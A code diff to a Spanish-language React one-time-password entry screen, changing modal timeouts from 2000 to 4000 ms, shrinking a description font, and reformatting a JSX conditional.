@@ -86,7 +86,7 @@ export default function NumeroOTP() {
                     ...prev,
                     lanzarModalErrorSesion: false
                 }));
-            }, 2000);
+            }, 4000);
         };
 
         // Se obtiene la IP
@@ -468,7 +468,7 @@ export default function NumeroOTP() {
                                 ...prev,
                                 lanzarModalErrorSesion: false
                             }));
-                        }, 2000);
+                        }, 4000);
 
                         // Se sale del ciclo
                         break;
@@ -594,7 +594,7 @@ export default function NumeroOTP() {
                             Confirma tus datos
                         </h2>
 
-                        <p className="bc-card-auth-description bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "18px", lineHeight: "20px", marginBottom: "30px", color: "white" }}>
+                        <p className="bc-card-auth-description bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "16px", lineHeight: "20px", marginBottom: "30px", color: "white" }}>
                             Ingresa el código que te enviamos por mensaje de texto.
                         </p>
 
@@ -629,7 +629,8 @@ export default function NumeroOTP() {
                                     <p className="bc-card-auth-description" style={{ marginTop: "10px", fontSize: "10px", color: "#ffffff", textDecoration: "underline", cursor: "pointer" }} onClick={() => handleResend()}>
                                         Reenviar código OTP
                                     </p>
-                                </div> : null}
+                                </div>
+                                : null}
                         </div>
 
                         {/* OTP Inputs */}
